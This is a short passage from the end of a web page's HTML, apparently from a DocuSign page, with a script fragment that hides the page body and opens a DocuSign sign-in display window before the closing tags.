                    var bdy = document.getElementsByTagName('body');
                    if (bdy) bdy[0].style.display = 'none';
                }
                window.open('https://www.docusign.net/member/janraindisplay.aspx');
            } //]]>
        </script>
    </form>




</body>



</html>
